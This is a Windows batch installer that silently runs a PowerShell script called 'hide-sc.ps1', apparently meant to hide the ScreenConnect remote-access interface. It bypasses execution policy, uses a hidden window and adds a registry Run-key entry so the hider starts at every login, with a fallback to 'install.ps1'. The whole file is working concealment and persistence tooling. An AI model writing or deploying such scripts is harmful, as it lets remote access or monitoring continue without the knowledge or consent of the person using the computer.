@echo off
setlocal EnableExtensions
cd /d "%~dp0"

set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "SCRIPT=%~dp0hide-sc.ps1"
set "REGKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "VAL=HideScreenConnectUI"

if not exist "%PS%" (
    echo ERROR: PowerShell not found.
    exit /b 1
)

if not exist "%SCRIPT%" (
    echo ERROR: hide-sc.ps1 not found in %~dp0
    exit /b 1
)

echo Starting hider now...
start "" /B "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"

echo Adding to Registry Startup...
reg add "%REGKEY%" /v "%VAL%" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f
if errorlevel 1 (
    echo Registry failed, trying install.ps1...
    "%PS%" -NoProfile -ExecutionPolicy Bypass -File "%~dp0install.ps1"
    exit /b %errorlevel%
)

echo.
echo SUCCESS - Installed permanently.
echo Runs at every login via Registry Startup.
exit /b 0
